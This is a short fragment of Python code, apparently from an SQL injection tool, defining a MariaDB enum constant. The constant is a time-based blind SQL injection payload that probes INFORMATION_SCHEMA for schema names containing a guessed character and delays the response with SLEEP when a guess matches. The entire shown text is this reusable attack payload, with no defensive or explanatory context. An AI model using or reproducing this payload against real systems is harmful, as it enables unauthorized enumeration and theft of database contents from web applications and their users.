...
class MariaDB(Enum):
    ...
    DATABASE_NAME_CHAR = '(SELECT * FROM (SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME LIKE (SELECT CONCAT(CONVERT(0x25 USING utf8), CONVERT({} USING utf8), CONVERT(0x25 USING utf8)))) > 0,(SELECT SLEEP(2)),0))GDiu)'
